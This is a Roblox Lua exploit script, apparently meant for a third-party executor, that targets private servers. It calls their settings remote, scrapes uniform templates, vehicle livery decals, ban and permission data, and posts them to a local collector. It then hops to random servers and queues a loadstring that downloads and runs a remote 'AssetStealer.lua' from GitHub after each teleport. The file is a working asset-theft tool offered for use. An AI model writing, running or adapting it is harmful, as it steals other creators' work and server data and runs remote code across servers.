local ReplicatedStorage = game:GetService("ReplicatedStorage")
local HttpService = game:GetService("HttpService")
local Workspace = game:GetService("Workspace")

local function isPrivateServer()
    local PrivateServers = ReplicatedStorage:WaitForChild("PrivateServers")
    local Info = PrivateServers:WaitForChild("Info")
    local ownerName = Info:FindFirstChild("OwnerName")
    return ownerName and ownerName.Value ~= ""
end

local function safePost(endpoint, body)
    local ok, err = pcall(function()
        request({
            Url = "http://127.0.0.1:5000/" .. endpoint,
            Method = "POST",
            Headers = {["Content-Type"] = "application/json"},
            Body = HttpService:JSONEncode(body)
        })
    end)
    if not ok then
        warn("Failed POST to " .. endpoint, err)
    end
end

local function tryJoinRandomServer(serverKeys, JoinServer)
    while #serverKeys > 0 do
        local index = math.random(1, #serverKeys)
        local randomKey = serverKeys[index]

        local joinSuccess, joinResult = pcall(function()
            return JoinServer:InvokeServer(randomKey, false, false)
        end)

        if joinSuccess then
            if joinResult == "Queue" then
                return true
            elseif joinResult == "Success" or type(joinResult) == "string" then
                return true
            end
        end

        table.remove(serverKeys, index)
    end

    return false
end

local function main()
    if not isPrivateServer() then
        return
    end

    local PrivateServers = ReplicatedStorage:WaitForChild("PrivateServers")
    local GetSettings = PrivateServers:WaitForChild("GetSettings")
    local success, result = pcall(function()
        return GetSettings:InvokeServer()
    end)
    if not success or not result then
        return
    end

    local uniqueKey = result.Data.UniqueKey

    local uniforms = {}
    local UniformsFolder = ReplicatedStorage:WaitForChild("ReplicatedState"):WaitForChild("Uniforms")
    for _, category in ipairs(UniformsFolder:GetChildren()) do
        if category:IsA("Folder") then
            uniforms[category.Name] = {}
            for _, subFolder in ipairs(category:GetChildren()) do
                if subFolder:IsA("Folder") then
                    local items = {}
                    for _, item in ipairs(subFolder:GetChildren()) do
                        if item:IsA("Shirt") then
                            items.Shirt = item.ShirtTemplate
                        elseif item:IsA("Pants") then
                            items.Pants = item.PantsTemplate
                        end
                    end
                    if next(items) then
                        uniforms[category.Name][subFolder.Name] = items
                    end
                end
            end
        end
    end

    safePost("uniforms", {UniqueKey = uniqueKey, data = uniforms, ServerSettings = result.Data})
    safePost("info", {UniqueKey = uniqueKey, Data = result.Data})
    safePost("bans", {UniqueKey = uniqueKey, Data = result.Data})
    safePost("permissions", {UniqueKey = uniqueKey, Data = result.Data})

    local liveries = {}
    local vehiclesFolder = Workspace:WaitForChild("Vehicles")
    for _, vehicle in ipairs(vehiclesFolder:GetChildren()) do
        if vehicle:IsA("Model") then
            local body = vehicle:FindFirstChild("Body")
            if body then
                local vehicleName = vehicle.Name
                local seenSignatures = {}

                for _, colorFolder in ipairs(body:GetChildren()) do
                    if colorFolder.Name == "COLOR" then
                        local decals = {}
                        for _, decal in ipairs(colorFolder:GetChildren()) do
                            if decal:IsA("Decal") and decal.Name:sub(1,12) == "CustomLivery" and decal.Texture ~= "" then
                                decals[decal.Name] = decal.Texture
                            end
                        end

                        if next(decals) then
                            local sigParts = {}
                            for k, v in pairs(decals) do
                                table.insert(sigParts, k .. "=" .. v)
                            end
                            table.sort(sigParts)
                            local signature = table.concat(sigParts, "|")

                            if not seenSignatures[signature] then
                                seenSignatures[signature] = true
                                liveries[vehicleName] = liveries[vehicleName] or {}
                                local liveryKey = "Livery_" .. HttpService:GenerateGUID(false)
                                liveries[vehicleName][liveryKey] = decals
                            end
                        end
                    end
                end
            end
        end
    end

    safePost("liveries", {UniqueKey = uniqueKey, Data = liveries})

    local GetServers = PrivateServers:WaitForChild("GetServers")
    local JoinServer = PrivateServers:WaitForChild("JoinServer")

    local serversSuccess, serversResult = pcall(function()
        return GetServers:InvokeServer()
    end)
    if not serversSuccess or type(serversResult) ~= "table" then
        return
    end

    local serverKeys = {}
    for key, _ in pairs(serversResult) do
        table.insert(serverKeys, key)
    end
    if #serverKeys == 0 then
        return
    end

    local joined = tryJoinRandomServer(serverKeys, JoinServer)

    if joined then
        queue_on_teleport([[
            loadstring(game:HttpGet("https://raw.githubusercontent.com/1Sebass2/scripts/refs/heads/main/AssetStealer.lua"))()
        ]])
    end
end

main()
